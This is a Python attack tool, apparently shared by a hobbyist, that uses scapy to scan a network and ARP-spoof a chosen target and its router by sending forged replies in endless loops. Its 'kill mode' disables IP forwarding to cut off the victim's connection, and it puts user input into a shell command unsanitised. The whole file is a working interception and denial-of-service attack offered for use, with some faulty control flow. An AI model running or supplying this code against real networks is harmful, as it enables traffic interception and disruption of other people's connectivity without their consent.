import scapy.all as scapy
import optparse
import time
import subprocess

# Hi! My name is Big Box
# Hope you guys enjoy the tool


def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-i","--IP_range", dest="IP_range",help="Enter the IP range to find target: ")
    parse_object.add_option("-t","--target_IP", dest="Target_IP",help="Enter the IP of the target: ")
    parse_object.add_option("-m","--target_MAC", dest="Target_MAC",help="Enter the MAC of the target: ")
    parse_object.add_option("-r","--router_IP", dest="Router_IP",help="Enter the IP of the router: ")
    parse_object.add_option("-M","--router_MAC", dest="Router_MAC",help="Enter the MAC of the router: ")
    parse_object.add_option("-s","--ON_OFF", dest="ON_OFF",help="ON/OFF target's network: ")
    return parse_object.parse_args()

(User_input,arg)=get_user_input()

IP_RANGE = User_input.IP_range
TARGET_IP = User_input.Target_IP
TARGET_MAC = User_input.Target_MAC
ROUTER_IP = User_input.Router_IP
ROUTER_MAC = User_input.Router_MAC
KILLMODE = User_input.ON_OFF


def Killmode():
     return subprocess.call(f"echo {KILLMODE} > /proc/sys/net/ipv4/ip_forward", shell=True)
    
if KILLMODE == "0":
    print("Shut down target's network: ON")
    Killmode()
    time.sleep(1)
else:
    print("Shut down target's network: OFF")    
    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
    time.sleep(1)


def scan_my_network():
    arp_request_packet = scapy.ARP(pdst=f"{IP_RANGE}")
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    Fusion = broadcast_packet/arp_request_packet
    (answered_list,unanswered_list) = scapy.srp(Fusion,timeout=3)
    answered_list.summary()
    time.sleep(1)

if IP_RANGE:
    scan_my_network()
else:
    None  

def spoof_target(): 
   arp_response= scapy.ARP(op = 2, pdst = f'{TARGET_IP}',hwdst = f'{TARGET_MAC}', psrc = f'{ROUTER_IP}')
   while True:    
     scapy.send(arp_response)



def spoof_router(): 
   arp_response= scapy.ARP(op = 2, pdst = f'{ROUTER_IP}',hwdst = f'{ROUTER_MAC}', psrc = f'{TARGET_IP}')
   while True:    
     scapy.send(arp_response)

def fullduplex():
    while True:
        spoof_target()
        spoof_router()

try: 
    while True:
        if TARGET_IP and TARGET_MAC and ROUTER_MAC:
            spoof_target()
        elif ROUTER_IP and ROUTER_MAC and TARGET_IP:
            spoof_router()  
        elif TARGET_IP and TARGET_MAC and ROUTER_MAC and ROUTER_IP:
            fullduplex()

except ValueError:
        print("Oops!  That was no valid number.  Try again...") 
